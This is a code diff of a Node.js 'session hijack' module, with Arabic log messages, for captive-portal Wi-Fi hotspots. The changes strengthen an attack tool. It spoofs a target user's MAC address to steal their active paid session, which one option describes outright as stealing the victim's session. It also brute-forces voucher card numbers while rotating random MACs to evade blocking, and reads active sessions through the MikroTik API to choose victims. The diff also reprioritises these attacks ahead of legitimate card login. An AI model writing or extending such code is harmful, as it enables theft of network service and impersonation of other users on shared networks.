@@ -91,12 +91,18 @@ function emitStep(step, status, data) {
   progressEmitter.emit('hijack-progress', hijackProgress);
 }
 
+let _lastPollMsg = '';
 function emitLog(message, type = 'info') {
   const event = { message, type, timestamp: Date.now() };
   if (hijackProgress) {
     hijackProgress.logs.push(event);
   }
   progressEmitter.emit('hijack-log', event);
+  if (message === _lastPollMsg) return;
+  _lastPollMsg = message;
+  if (type === 'error') logger.error(`[UI] ${message}`);
+  else if (type === 'warn') logger.warn(`[UI] ${message}`);
+  else logger.info(`[UI] ${message}`);
 }
 
 async function detectHotspot(gatewayIp) {
@@ -106,54 +112,56 @@ async function detectHotspot(gatewayIp) {
     gatewayIp ? `http://${gatewayIp}/` : null,
     gatewayIp ? `http://${gatewayIp}/status` : null,
     gatewayIp ? `http://${gatewayIp}/hotspotlogin` : null,
-    'http://m.net/',
-    'http://m.net/index.html',
-    'http://www.h.net/',
-    'http://www.h.net/index.html',
     gatewayIp ? `http://${gatewayIp}/login` : null,
   ].filter((v, i, a) => v && a.indexOf(v) === i);
 
-  for (const tryUrl of tryUrls) {
-    emitLog(`🔎 تجربة URL: ${tryUrl}`);
+  const probeUrl = async (url) => {
     try {
-      const resp = await axios.get(tryUrl, {
-        timeout: 6000,
+      const resp = await axios.get(url, {
+        timeout: 3000,
         validateStatus: () => true,
         headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
       });
       const html = typeof resp.data === 'string' ? resp.data : '';
       if (html && html.length > 50) {
         const sessionActive = html.includes('remain_bytes_total') || html.includes('تم تسجيل') || html.includes('status.html');
-        emitLog(`✅ الهوتسبوت: ${tryUrl} (${resp.status}, ${html.length}b)`);
-        if (sessionActive) {
-          return { found: true, url: tryUrl, sessionActive: true };
-        }
-        return { found: true, url: tryUrl, sessionActive: false };
+        return { found: true, url, sessionActive, data: html };
       }
-      emitLog(`⚠️ ${tryUrl}: استجابة صغيرة (${html.length}b)`);
-    } catch (err) {
-      emitLog(`⚠️ ${tryUrl}: فشل الاتصال`);
-    }
+    } catch {}
+    return null;
+  };
+
+  emitLog(`🔎 فحص ${tryUrls.length} رابط...`);
+  const results = await Promise.allSettled(tryUrls.map(probeUrl));
+  const found = results.find(r => r.value && r.value.found);
+
+  if (found) {
+    emitLog(`📡 تم العثور على الهوتسبوت: ${found.value.url}`);
+    return { found: true, url: found.value.url, sessionActive: found.value.sessionActive };
   }
-  return { found: false, url: null, sessionActive: false };
+
+  return { found: false, url: null, sessionActive: false, reason: `فشلت كل الـ URLs (${tryUrls.length})` };
 }
 
 async function checkSessionViaStatus(baseUrl, maxAttempts = 5) {
   const statusUrl = baseUrl.replace(/\/+$/, '').replace(/\/index\.html$/, '') + '/status';
   for (let i = 0; i < maxAttempts; i++) {
-    await sleep(1000);
+    await sleep(500);
     try {
       const resp = await axios.get(statusUrl, { timeout: 2000, validateStatus: () => true });
       const html = typeof resp.data === 'string' ? resp.data : '';
+      const snippet = html ? html.substring(0, 150).replace(/\n/g, ' ').trim() : '(فارغ)';
       if (html.includes('remain_bytes_total') || html.includes('تم تسجيل') || html.includes('status.html')) {
-        return { sessionActive: true, remainBytes: 'available' };
+        emitLog(`✅ الرد من ${statusUrl} ← HTTP ${resp.status} (${html.length}b) — [جلسة نشطة] ${snippet}`);
+        return { sessionActive: true, remainBytes: 'available', httpStatus: resp.status, bodyLength: html.length };
       }
-      emitLog(`⏳ في انتظار الجلسة... (${i+1}/${maxAttempts})`);
-    } catch {
-      emitLog(`⏳ في انتظار الاستجابة... (${i+1}/${maxAttempts})`);
+      emitLog(`⏳ في انتظار الجلسة... (${i+1}/${maxAttempts}) ← HTTP ${resp.status} (${html.length}b) ${snippet}`);
+    } catch (err) {
+      const code = err.code || err.message || '';
+      emitLog(`⏳ في انتظار الجلسة... (${i+1}/${maxAttempts}) ← ${code.includes('ENOTFOUND') ? 'DNS' : code.includes('TIMEOUT') ? 'مهلة' : code.includes('ECONNREFUSED') ? 'رفض' : code}`);
     }
   }
-  return { sessionActive: false };
+  return { sessionActive: false, reason: `انتهى الانتظار (${maxAttempts} محاولات)` };
 }
 
 async function tryCardLogin(hotspotUrl) {
@@ -167,26 +175,31 @@ async function tryCardLogin(hotspotUrl) {
   const usedCards = [];
 
   for (const card of cards) {
-    emitLog(`🔑 تجربة الكرت ****${card.number.slice(-4)}`);
+    emitLog(`🔑 تجربة الكرت ****${card.number.slice(-4)} (domain: ${card.domain})`);
     try {
       const result = await hotspotAuth.login(card.number, card.domain);
       if (result.isSuccess) {
-        emitLog(`✅ تسجيل دخول ناجح بالكرت ****${card.number.slice(-4)}`, 'success');
+        const note = result.value?.note || '';
+        emitLog(`✅ ${note.includes('session-already-active') ? 'جلسة موجودة مسبقاً (الكرت لم يستخدم)' : 'تسجيل دخول ناجح'} بالكرت ****${card.number.slice(-4)}`, 'success');
         usedCards.push(card.number.slice(-4));
-        const idx = sessionStore.getCards().findIndex(c => c.number === card.number);
-        if (idx >= 0) sessionStore.markCardUsed(idx);
+
+        if (!note.includes('session-already-active')) {
+          const idx = sessionStore.getCards().findIndex(c => c.number === card.number);
+          if (idx >= 0) sessionStore.markCardUsed(idx);
+        }
 
         sessionStore.addHistoryEntry({
           type: 'login',
           cardNumber: card.number.slice(-4),
           domain: card.domain,
           success: true,
+          note,
           source: 'hijack-card-login',
         });
 
-        return { success: true, usedCards, sessionInfo: { sessionActive: true, card: card.number.slice(-4) } };
+        return { success: true, usedCards, sessionInfo: { sessionActive: true, card: card.number.slice(-4), note } };
       }
-      emitLog(`⚠️ الكرت ****${card.number.slice(-4)}: ${result.error || 'فشل'}`);
+      emitLog(`⚠️ الكرت ****${card.number.slice(-4)}: ${result.error || 'فشل'} (${result.statusCode || '?'})`);
     } catch (err) {
       emitLog(`⚠️ الكرت ****${card.number.slice(-4)}: ${err.message}`);
     }
@@ -284,7 +297,12 @@ async function tryBruteForce(hotspotUrl) {
         blocked = true;
         try {
           const newMac = wifiManager.generateRandomMac();
-          await wifiManager.spoofMac(newMac, { noLaaFix: true });
+          try {
+            await wifiManager.spoofMac(newMac, { noLaaFix: true });
+          } catch (spoofErr2) {
+            emitLog(`⚠️ تدوير MAC بدون LAA فشل، تجربة مع LAA fix...`, 'warn');
+            await wifiManager.spoofMac(newMac);
+          }
           emitLog(`🔄 MAC تم تدويره إلى ${newMac}`);
           await sleep(4000);
         } catch (err) {
@@ -316,26 +334,28 @@ async function trySmartAuto(targetIp, targetMac, gatewayIp) {
     }
   }
 
-  emitLog('⏳ 2/4 انتظار الجلسة (10 ثوان)...');
+  emitLog('⏳ 2/4 انتظار الجلسة (30 ثانية)...');
   const hotspotUrl = hotspotAuth.getConfig().url || `http://${gatewayIp || 'm.net'}/`;
-  const waitResult = await checkSessionViaStatus(hotspotUrl, 10);
+  const waitResult = await checkSessionViaStatus(hotspotUrl, 30);
   if (waitResult.sessionActive) {
     return { strategy: 'session-wait', success: true, sessionInfo: waitResult };
   }
 
+  emitLog('⚡ 3/4 تخمين الكروت...');
+  const bruteResult = await tryBruteForce(hotspotUrl);
+  if (bruteResult.success) {
+    return { strategy: 'brute-force', ...bruteResult };
+  }
+
   const availableCards = sessionStore.getCards().filter(c => c.status === 'ready' || c.status === 'active');
-  if (availableCards.length > 0) {
-    emitLog(`💳 3/4 تسجيل الدخول بالكروت (${availableCards.length} متاح)...`);
+  if (availableCards.length >= 5) {
+    emitLog(`💳 4/4 تسجيل الدخول بالكروت (${availableCards.length} متاح)...`);
     const cardResult = await tryCardLogin(hotspotUrl);
     if (cardResult.success) {
       return { strategy: 'card-login', ...cardResult };
     }
-  }
-
-  emitLog('⚡ 4/4 تخمين الكروت...');
-  const bruteResult = await tryBruteForce(hotspotUrl);
-  if (bruteResult.success) {
-    return { strategy: 'brute-force', ...bruteResult };
+  } else if (availableCards.length > 0) {
+    emitLog(`⚠️ تخطي الكروت — ${availableCards.length} فقط غير كافية`, 'warn');
   }
 
   return { strategy: 'smart-auto', success: false };
@@ -402,7 +422,15 @@ const sessionHijack = {
       try {
         emitLog(`♻️ استعادة MAC الأصلي ${originalMac}...`);
         if (originalMac && originalMac !== 'غير معروف') {
-          await wifiManager.spoofMac(originalMac, { noLaaFix: true });
+          const origFirstByte = parseInt(originalMac.replace(/[:-]/g, '').substring(0, 2), 16);
+          const origHasLaa = (origFirstByte & 0x02) !== 0;
+          if (origHasLaa) {
+            emitLog(`⚠️ استعادة عبر spoof (LAA=${origFirstByte.toString(16).toUpperCase()})`, 'warn');
+            await wifiManager.spoofMac(originalMac, { noLaaFix: true });
+          } else {
+            emitLog(`⚠️ استعادة عبر reset (لأن MAC الأصلي UAA)`, 'warn');
+            await wifiManager.resetMac();
+          }
         } else {
           await wifiManager.resetMac();
         }
@@ -413,9 +441,10 @@ const sessionHijack = {
     };
 
     const complete = async (hijackSuccess, sessionInfo, loginResult, strategyUsed) => {
+      clearTimeout(hijackTimer);
       const elapsed = Date.now() - startTime;
 
-      if (!hijackSuccess && macSpoofed) {
+      if (!hijackSuccess && macSpoofed && !config?.hijack?.keepMacOnFailure) {
         await restoreOriginalMac();
       }
 
@@ -478,8 +507,9 @@ const sessionHijack = {
     };
 
     const handleError = async (err) => {
+      clearTimeout(hijackTimer);
       hijackState.inProgress = false;
-      if (macSpoofed) {
+      if (macSpoofed && !config?.hijack?.keepMacOnFailure) {
         await restoreOriginalMac();
       }
       logger.error('Hijack error', err.message);
@@ -493,6 +523,12 @@ const sessionHijack = {
     const strategy = options.strategy || 'smart-auto';
     logger.info(`Starting hijack: ${targetIp} / ${targetMac} [strategy: ${strategy}]`);
     emitLog(`🚀 بدء اختراق ${targetIp} (${STRATEGY_LABELS[strategy]?.label || strategy})`);
+
+    const hijackTimer = setTimeout(() => {
+      emitLog(`⚠️ تجاوز الوقت المسموح (180 ثانية) — إلغاء`, 'error');
+      hijackState.inProgress = false;
+      hijackProgress = null;
+    }, 180000);
 
     try {
       emitStep('save_original_mac', 'running');
@@ -538,8 +574,33 @@ const sessionHijack = {
 
       emitStep('spoof_mac', 'running');
       emitLog(`🔄 تغيير MAC إلى ${targetMac}`);
-      await wifiManager.spoofMac(targetMac, { noLaaFix: true });
-      macSpoofed = true;
+
+      let skipSpoof = false;
+      try {
+        const currentMac = await wifiManager.getCurrentMac();
+        const currentLaa = parseInt(currentMac.replace(/[:-]/g, '').substring(0, 2), 16);
+        const targetClean = targetMac.replace(/[:-]/g, '').toUpperCase();
+        const targetLaaFixed = ((parseInt(targetClean.substring(0, 2), 16) | 0x02) & 0xFE).toString(16).toUpperCase().padStart(2, '0') + targetClean.substring(2);
+        const currentClean = currentMac.replace(/[:-]/g, '').toUpperCase();
+        if (currentClean === targetClean || currentClean === targetLaaFixed) {
+          emitLog(`✅ MAC مطابق مسبقاً — تخطي التغيير`);
+          macSpoofed = true;
+          skipSpoof = true;
+        }
+      } catch {}
+
+      if (!skipSpoof) {
+        const firstByte = parseInt(targetMac.replace(/[:-]/g, '').substring(0, 2), 16);
+        const hasLaaBit = (firstByte & 0x02) !== 0;
+        if (hasLaaBit) {
+          await wifiManager.spoofMac(targetMac, { noLaaFix: true });
+        } else {
+          emitLog(`⚠️ MAC الهدف UAA (LAA=0) — سيتم تعديل LAA bit تلقائياً`, 'warn');
+          await wifiManager.spoofMac(targetMac);
+        }
+        macSpoofed = true;
+      }
+
       hijackProgress.progress = 40;
       emitStep('spoof_mac', 'done', targetMac);
       emitLog(`✅ MAC تم التغيير: ${originalMac} ← ${targetMac}`);
@@ -550,9 +611,17 @@ const sessionHijack = {
       let connected = false;
       let scanAttempt = 0;
       const startWait = Date.now();
-      const MAX_WAIT_MS = 40000;
+      const MAX_WAIT_MS = 15000;
 
-      while (Date.now() - startWait < MAX_WAIT_MS) {
+      try {
+        const quick = await wifiManager.quickCheck();
+        if (quick && quick.connected && quick.ssid) {
+          emitLog(`✅ متصل بـ ${quick.ssid} (مباشر)`);
+          connected = true;
+        }
+      } catch {}
+
+      while (!connected && Date.now() - startWait < MAX_WAIT_MS) {
         scanAttempt++;
         try {
           const quick = await wifiManager.quickCheck();
@@ -562,47 +631,38 @@ const sessionHijack = {
             break;
           }
         } catch {}
-        await sleep(1000);
-      }
-
-      if (!connected) {
-        await sleep(2000);
-        try {
-          const quick = await wifiManager.quickCheck();
-          if (quick && quick.connected && quick.ssid) {
-            connected = true;
-            emitLog(`✅ متصل بـ ${quick.ssid}`);
-          }
-        } catch {}
-      }
-
-      if (!connected) {
-        emitLog(`⚠️ netsh لم يكتشف الاتصال, جاري محاولة ping...`);
-        try {
-          const ping = require('child_process').execFileSync('ping', ['-n', '1', '-w', '2000', gatewayIp || '8.8.8.8'], { timeout: 3000, encoding: 'utf-8', stdio: 'pipe' });
-          if (ping.includes('TTL=') || ping.includes('Reply from')) {
-            connected = true;
-            emitLog(`✅ ping ناجح - متصل بالشبكة`);
-          }
-        } catch {}
-        if (!connected) {
+        if (!connected && scanAttempt === 5) {
           try {
             const { execFileSync } = require('child_process');
-            const adapters = execFileSync('powershell', ['-NoProfile', '-Command', '(Get-NetAdapter -Name \"Wi-Fi\" -ErrorAction SilentlyContinue).Status'], { timeout: 5000, encoding: 'utf-8' });
+            const adapters = execFileSync('powershell', ['-NoProfile', '-Command', '(Get-NetAdapter -Name \"Wi-Fi\" -ErrorAction SilentlyContinue).Status'], { timeout: 3000, encoding: 'utf-8' });
             if (adapters.trim() === 'Up') {
               connected = true;
               emitLog(`✅ محول WiFi في حالة Up`);
             }
           } catch {}
         }
+        await sleep(500);
       }
 
       hijackProgress.progress = 55;
       emitStep('wait_for_connection', 'done');
       emitLog(`✅ تم الاتصال بالشبكة`);
 
+      try {
+        const { execFileSync } = require('child_process');
+        const ipInfo = execFileSync('powershell', ['-NoProfile', '-Command',
+          '$r=Get-NetRoute -DestinationPrefix "0.0.0.0/0"|Where-Object NextHop -ne "0.0.0.0"|Select-Object -First 1; if($r){$idx=$r.InterfaceIndex;$a=Get-NetAdapter -InterfaceIndex $idx -ErrorAction SilentlyContinue;$ip=Get-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv4 -ErrorAction SilentlyContinue|Select-Object -First 1;$gw=$r.NextHop; Write-Output "WiFi=$($a.Name) IP=$($ip.IPAddress) GW=$gw"}else{Write-Output "No route"}'
+        ], { timeout: 5000, encoding: 'utf-8' });
+        emitLog(`📡 فحص الاتصال: ${(ipInfo || '').trim()}`);
+      } catch (e) {
+        emitLog(`⚠️ فحص الاتصال: ${e.message.slice(0, 150)}`);
+      }
+
       emitStep('detect_hotspot', 'running');
-      const detectedHotspot = await detectHotspot(gatewayIp);
+      const detectedHotspot = await Promise.race([
+        detectHotspot(gatewayIp),
+        sleep(15000).then(() => { emitLog(`⚠️ انتهت مهلة فحص الهوتسبوت`, 'warn'); return { found: false }; }),
+      ]);
 
       if (!detectedHotspot || !detectedHotspot.found) {
         emitLog(`❌ لم يتم العثور على الهوتسبوت`, 'error');
@@ -627,8 +687,9 @@ const sessionHijack = {
       let finalResult = { success: false, sessionInfo: null };
 
       if (strategy === 'session-wait') {
-        emitLog(`⏳ انتظار الجلسة لمدة 20 ثانية...`);
-        const waitResult = await checkSessionViaStatus(detectedHotspot.url, 20);
+        const waitSec = config?.hijack?.sessionWaitMaxSec || 35;
+        emitLog(`⏳ انتظار الجلسة لمدة ${waitSec} ثانية...`);
+        const waitResult = await checkSessionViaStatus(detectedHotspot.url, waitSec);
         finalResult = { success: waitResult.sessionActive, sessionInfo: waitResult };
       } else if (strategy === 'card-login') {
         emitLog(`💳 تجربة الكروت المتاحة...`);
@@ -712,23 +773,10 @@ const sessionHijack = {
     const available = [];
     const cards = sessionStore.getCards().filter(c => c.status === 'ready' || c.status === 'active');
 
-    if (cards.length > 0) {
-      available.push({
-        id: 'card-login',
-        icon: '💳',
-        label: 'تسجيل الدخول بالكروت',
-        description: `${cards.length} كرت متاح`,
-        confidence: 'high',
-        priority: 1,
-      });
-    }
-
     const api = getMikrotikApi();
-    let apiHasSessions = false;
     if (api.enabled) {
       try {
         const activeSessions = await api.getActiveHotspotSessions();
-        apiHasSessions = activeSessions.length > 0;
         const targetSession = activeSessions.find(s => s.mac === (targetMac || '').toUpperCase());
         available.push({
           id: 'api-session',
@@ -738,7 +786,7 @@ const sessionHijack = {
             ? `✅ جلسة نشطة للهدف موجودة (${targetSession.user || 'مجهول'})`
             : `${activeSessions.length} جلسة نشطة (لكن ليست للهدف)`,
           confidence: targetSession ? 'very-high' : 'medium',
-          priority: targetSession ? 0 : 3,
+          priority: 0,
         });
       } catch (err) {
         available.push({
@@ -766,20 +814,29 @@ const sessionHijack = {
         id: 'session-wait',
         icon: '⏳',
         label: 'انتظار الجلسة',
-        description: 'يعمل فقط إذا كانت الجلسة نشطة مسبقاً',
-        confidence: 'low',
-        priority: 4,
+        description: 'سرقة جلسة الضحية عبر MAC spoof + انتظار إعادة الاتصال',
+        confidence: 'medium',
+        priority: 1,
       });
     }
 
-    if (cards.length === 0) {
+    available.push({
+      id: 'brute-force',
+      icon: '⚡',
+      label: 'تخمين الكروت',
+      description: 'تخمين أرقام الكروت مع تدوير MAC تلقائي',
+      confidence: 'low',
+      priority: 3,
+    });
+
+    if (cards.length >= 5) {
       available.push({
-        id: 'brute-force',
-        icon: '⚡',
-        label: 'تخمين الكروت',
-        description: 'تخمين أرقام مع تدوير MAC',
-        confidence: 'medium',
-        priority: 5,
+        id: 'card-login',
+        icon: '💳',
+        label: 'تسجيل الدخول بالكروت',
+        description: `${cards.length} كرت متاح — ملاذ أخير`,
+        confidence: 'low',
+        priority: 8,
       });
     }
 
